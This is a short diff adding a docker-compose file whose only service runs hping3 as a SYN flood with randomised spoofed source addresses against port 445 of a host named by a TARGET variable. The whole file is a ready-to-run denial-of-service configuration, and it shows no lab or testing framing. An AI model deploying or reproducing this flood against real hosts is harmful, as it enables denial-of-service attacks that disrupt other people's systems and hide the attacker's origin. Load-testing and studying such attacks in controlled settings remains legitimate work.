@@ -1,0 +1,8 @@
+version: "3"
+
+services: 
+    my_ping:
+        build: my_ping
+        environment:
+            TARGET: ${TARGET}
+        command: hping3 -V -d 120 -S -w 64 -p 445 -s 445 --flood --rand-source $TARGET
